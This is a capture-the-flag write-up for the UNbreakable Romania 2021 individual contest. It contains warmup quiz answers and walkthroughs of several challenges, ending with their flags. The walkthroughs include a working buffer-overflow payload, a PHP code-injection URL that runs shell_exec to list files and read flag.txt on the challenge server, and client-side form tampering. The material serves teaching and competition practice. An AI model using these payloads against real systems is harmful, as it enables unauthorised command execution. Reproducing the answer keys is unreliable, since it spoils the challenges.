# UNbreakable Romania Individual - Editia 2021
### https://unr21-individual.cyberedu.ro/

## Warmup UNR 21 Individual

Q1: Ce tip de control este implementarea unui firewall?

Format flag: txxxxx -> tehnic

Q2: Cum se numeste tehnologia cea mai populara ce este folosita în a identifica manual vulnerabilitati de Wordpress?

Format flag: WXsxxx -> WPscan

Q3: Ce factor biometric reprezinta un identificator unic per utilizator , ce este foarte des folosit în zilele noastre, mai ales în cazul aparaturilor mobile?

Format flag: axxxxxxx -> amprenta

Q4: Cum se numeste “inima” sistemului de operare?

Format flag: kxxxxx -> kernel

Q5: Ce metoda putem folosi pentru a insera valori intr-un sir de text?

Format flag: fxxxxx sxxxxx -> format string

Q6: Ce metoda de protectie putem folosi în a impiedica exploarea vulnerabilitatilor ce tin de memoriile corupte aferente programelor targetate?

Format flag: AXXX -> ASLR

Q7: Cum numim vulnerabilitatea prin care un program este fortat să execute doua sau mai multe functii în acelasi timp?

Format flag: rxxx cxxxxxxxx -> race condition

Q8: Cum se numeste metoda de protectie aplicata unui binar, ce face ca valorile din memorie să primeasca alta adresa de fiecare data cand acesta este lansat?

Format flag: PXX -> PIE

Q9: Cum se numeste procesul prin care un atacator sau un hacker etic poate ascunde un mesaj secret în interiorul unui mesaj vizibil, fara a putea fi interceptat?

Format flag: sxxxxxxxxxxxx -> steganografie

Q10: Care este unul dintre cele mai utilizate unelte pentru a ascunde mesaje în interiorul imaginilor și a fisierelor de tip .pdf?

Format flag: exxxxxxx -> exiftool

Q11: Ce extensie are o aplicație specifica pentru platforma iOS?

Format flag: ixx -> ipa

Q12: Cine a realizat primul jailbreak software pentru sistemul de operare iOS?

Format flag: Sxxxxx -> Saurik

Q13: Ce aplicație inlocuieste AppleStore, dupa ce un atacator conduce un proces de jailbreak pe un aparat mobil ce are instalat iOS OS? Tine cont ca aceasta aplicație este necesara utilizatorului rau intentionat pentru a și instala unelte de atac pentru aparatul targetat?

Format flag: Cxxxx -> Cydia

Q14: Ce instrument pentru platforma Linux putem folosi atunci cand cautam un set speciific de date în procesul de analiza a unui binar?

Format flag: gxxx -> grep

Q15: Cum numim un set de date ce poate avea doar valorile: “true” sau “false”?

Format flag: bxxxxxx -> boolean

Q16: Cum se numeste procesul prin care se extrag fisiere cu continut critic sau fisiere ce au fost sterse dintr-un mediu de stocare, atunci cand analizam un incident informatic?

Format flag: dxxx fxxxxxxxx -> disk forensics

Q17: Cu ce software putem analiza un fisier audio?

Format flag: Axxxxxx -> Audacity

Q18: Ce tip de program poate folosi un atacator pentru a evita procesul de autentificare intr-un sistem targetat?

Format flag: bxxxxxxx -> backdoor

Q19: Ce componenta este datoare intr-o retea de calculatoare să transmita pachete de date intre doua sau mai multe calculatoare?

Format flag: rxxxxx -> router

Q20: În utilizarea carui algortim este necesara o matrice de 5x5 pentru substituirea fiecarei litere din alfabet?

Format flag: Pxxxxxxx -> Playfair

Q21: Ce cipher are la baza tehnica Tabula recta inventata inventata in 1508 de Johannes Trithemius?

Format flag: Bxxxxxxx -> Beaufort

Q22: Ce protocol reprezinta baza de comunicare pentru World Wide Web?

Format flag: HXXX -> HTTP

Q23: Ce termen folosim atunci cand vorbim despre adresele web, care specifică și protocolul utilizat la trimiterea / primirea informațiilor?

Format flag: UXX -> URL

Q24: Ce metodologie este cea mai des folosita atunci cand un hacker etic conduce un test de tip black-box penetration?

Format flag: OXXXX -> OWASP

## overflowie - ctf{417e85857875cd875f23abee3d45ef6a4fa68a56e692a8c998e0d82f4f3e6ac7}

I inspected the file with objdump and I saw that I needed to do a buffer overflow.

The following payload is generated:
- 0x50 - 0x04 = 76 random bytes in order to fill the buffer;
- l33t = 0x6c333374 in order to overwrite the value of the variable which has to be equal to l33t.

```
python2 -c 'print "A" * 76 + "\x6c\x33\x33\x74\x00"' | ./overflowie
python2 -c 'print "A" * 76 + "\x6c\x33\x33\x74\x00"' | nc 34.107.86.157 32276
Enter the very secure code to get the flag: 
Omg you found the supersecret flag. You are l33t ind33d
ctf{417e85857875cd875f23abee3d45ef6a4fa68a56e692a8c998e0d82f4f3e6ac7}
```

## rsa-quiz - CTF{45d2f31123799facb31c46b757ed2cbd151ae8dd9798a9468c6f24ac20f91b90}

Run `rsaquiz.py` in order to compute the values. The answers are already stored
in `rsaquiz.txt`.
Run `cat rsaquiz.txt | nc 35.198.90.23 30147` in order to obtain the flag.

The following output is obtained:
```
What does the S in RSA stand for? -> shamir
If p is 19 and q is 3739, what is the value of n? -> 19*3739 = 71041

That was too simple! If n is 675663679375703 and q is 29523773, what is the value of p? -> 675663679375703 / 29523773 = 22885411

Ok, I'll just give you something harder!
n=616571, e=3, plaintext=1337
Gimme the ciphertext: -> 1337 ^ 3 mod 616571 = 150557

Maybe the numbers are too small...
e = 65537
p = 963760406398143099635821645271
q = 652843489670187712976171493587
Gimme the totient of n: -> 629184706918922046908481552646032188862036550371523772238220

Oh, you know some basic math concepts... then give me d (same p, q, e):
307128003403317747267180880276778243646877508627728107750933

You do seem to exhibit some signs of intelligence. Decrypt 572595362828191547472857717126029502965119335350497403975777 using the same values for e, p, and q (input a number):
1333333333333333333333333337

Hmm.. Please encrypt the number 12345667890987654321 for me (same values for p, q, e): 151278525444064658069879866884270452252861617143516500870512

It appears that you might be sentient...
n = 152929646813683153154787333192209811374534931741180398509668504886770084711528324536881564240152608914496861079378215645834083235871680777390419398324440551788881235875710125519745698893521658131360881276421398904578928914542813247036088610425115558275142389520693568113609349732403288787435837393262598817311
e = 65537
p = 11715663067252462334145907798116932394656022442626274139918684856227467477260502860548284356112191762447814937304839893522375277179695353326622698517979487
ciphertext =  92908075623156504607201038131151080534030070467291869074115564565673791201995576947013121170577615751235315949275320830645597799585395148208661103156568883014693664616195873778936141694426969384158471475412561910909609358186641323174105881281083630450513961668012263710620618509888202996082557289343751590657
Tell me the plaintext (as a number):
2097258740241773022137051374446964

Did you enjoy this quiz? (one word)
yes

The quiz is over! You got max points. Here's your reward:
CTF{45d2f31123799facb31c46b757ed2cbd151ae8dd9798a9468c6f24ac20f91b90}
```

## bork-sauls - ctf{d8194ce78a6c555adae9c14fe56674e97ba1afd88609c99dcb95fc599dcbc9f5}

I opened the file in Ghidra and saw that the file which contains the flag is
shown if -1 >= (int) (100000 + 1999999 * num_times_3_is_inputted).
Therefore I created the script `borksauls.py` which generates a large number of
3s (2000) and I saved the output in borksauls.txt:
```
cat borksauls.txt | nc 35.234.117.20 30158
```

## the-restaurant - CTF{192145131b9d4a787303963496e2e6ff438790db98b85df847c9b0e2ef0a5a07}

### http://34.89.172.250:30568/level-1.php
Select all the options:
```
The Restaurant, -1 stars
Saline Soup Eggless Eggs Mouldy Muffin Floppy Flag
```
1st part of flag: CTF{192145131

### http://34.89.172.250:30568/level0.php
Click `F12` and remove `disabled=""`:
2nd part of flag: b9d4a78730396

### http://34.89.172.250:30568/level1.php
Click `F12` and modify one of the ids to `flag` and the name to `flag`:
3496e2e6ff438

~ 3rd part of flag

### http://34.89.172.250:30568/level2.php
Select whatever you wan, click `F12` and replace `ticket:whatever` with
`ticket:flag`.

★ 4th part of flag ★

790db98b85df8

### http://34.107.86.157:32311/level3.php
Use the name `:flag`.
5th part of flag:

47c9b0e2ef0a5a07}

## substitute - CTF{92b435bcd2f70aa18c38cee7749583d0adf178b2507222cf1c49ec95bd39054c}

Get the existing files (`here_we_dont_have_flag index.php`):
```
http://35.198.90.23:30447/?replace=shell_exec("ls")&vector=/Admin/e
```
Get the file type of `here_we_dont_have_flag` (`directory`):
```
http://35.198.90.23:30447/?replace=shell_exec("file here_we_dont_have_flag")&vector=/Admin/e
```
Get the files from `here_we_dont_have_flag` (`flag.txt`):
```
http://35.198.90.23:30447/?replace=shell_exec("ls here_we_dont_have_flag/")&vector=/Admin/e
```
Get the flag:
```
http://35.198.90.23:30447/?replace=shell_exec("cat here_we_dont_have_flag/flag.txt")&vector=/Admin/e
```

## crazy-number - CTF{972d2068ed1914c5bf8ce44099d14647a53cf3113f8e0210593fd9d691de6724}

The encryption function prints a string in octal.

[Decrypt](http://www.unit-conversion.info/texttools/octal/)
```
103124106173071067062144062060066070145144061071061064143065142146070143145064064060071071144061064066064067141065063143146063061061063146070145060062061060065071063146144071144066071061144145066067062064175
```
and get the flag.

## crossed-pil - ctf{3c7f44ab3f90a097124ecedab70d764348cba286a96ef2eb5456bee7897cc685}

I found a hidden image:
```
binwalk -e image.zip 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, uncompressed size: 153442, name: image.png
76            0x4C            PNG image, 200 x 200, 8-bit/color RGBA, non-interlaced
117           0x75            Zlib compressed data, default compression
153371        0x2571B         End of Zip archive, footer length: 22
```

Then I found the python code which generated the image:
```
strings image.png
```
```
import numpy as np
from PIL import Image
import random
img = Image.open('flag.png')
pixels = list(img.getdata())
oioi=[]
for value in pixels:
    oi = []
    for oioioi in value:
        # hate me note for the var names ;)
        if oioioi == 255:
            oioioi = random.choice(range(0, 255, 2))
        else:
            oioioi = random.choice(range(0, 255, 1))
        oi.append(oioioi)
    oioi.append(oi)
img = Image.new('RGBA', [200,200], 255)
data = img.load()
count = 0
for x in range(img.size[0]):
    for y in range(img.size[1]):
        data[x,y] = (
            oioi[count][0],
            oioi[count][1],
            oioi[count][2],
            oioi[count][3],
        )
        count = count + 1

img.save('image.png')
```

I created the script `crossedpil.py` in which I tried to obtain the initial
image. I did the same procedure, but if a number was even, then the new value was 255, otherwise 0.
I saw that a picture similar to a QR code was generated, so if all the values
from a pixel were not black, then I made them white, otherwise black. The QR
code was incomplete, so I turned black the pixels which had at least 3 black
neighbours.
Then I [scanned the QR code](https://online-barcode-reader.inliteresearch.com/) and obtained the flag.
